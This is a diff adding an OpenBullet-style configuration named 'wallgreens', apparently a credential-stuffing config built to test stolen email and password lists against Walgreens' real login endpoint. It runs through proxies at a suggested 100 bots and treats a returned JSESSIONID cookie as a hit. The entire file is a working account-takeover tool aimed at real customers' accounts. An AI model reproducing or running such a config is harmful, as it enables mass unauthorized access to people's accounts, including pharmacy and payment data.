@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "wallgreens",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-17T05:49:41.6692543+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.walgreens.com/svc/profiles/login?instart_disable_injection=true" AutoRedirect=TRUE 
+  CONTENT "{\"login\":\"<USER>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.walgreens.com/login.jsp?clearIntent=true" 
+  HEADER "origin: https://www.walgreens.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "The information you entered doesn’t match our records" 
+    KEY "Please enter your username" 
+REQUEST POST "https://www.walgreens.com/svc/profiles/login?instart_disable_injection=true" AutoRedirect=TRUE 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"isConsentFlow\":true}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.walgreens.com/login.jsp?clearIntent=true" 
+  HEADER "origin: https://www.walgreens.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Internal Error" 
+    KEY "The information you entered doesn’t match our records" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "JSESSIONID" 
